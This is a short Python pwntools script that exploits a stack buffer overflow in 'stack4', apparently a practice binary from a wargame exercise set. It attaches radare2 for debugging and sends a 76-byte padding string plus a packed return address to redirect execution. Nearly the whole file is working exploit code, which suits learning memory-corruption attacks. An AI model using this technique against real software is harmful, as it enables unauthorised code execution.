#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import os
import sys

_DEBUG = True

context(arch='i386', os='linux')

e = ELF('../bin/stack4')
io = process('../bin/stack4')

pack = make_packer()
unpack = make_unpacker()

def radare2():
    c = "aaaa; db main; "
    c += "db 0x0804841d; "
    c += "db; "

    pid = util.proc.pidof(io)[0]
    os.system('screen r2 -d %d -c "%s"' % (pid, c))
    util.proc.wait_for_debugger(pid)

def exploit():
    try:
	
        io.sendline('A' * 76 + pack(0x80483f4))
        io.interactive()
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    if _DEBUG:
        radare2()
    exploit()
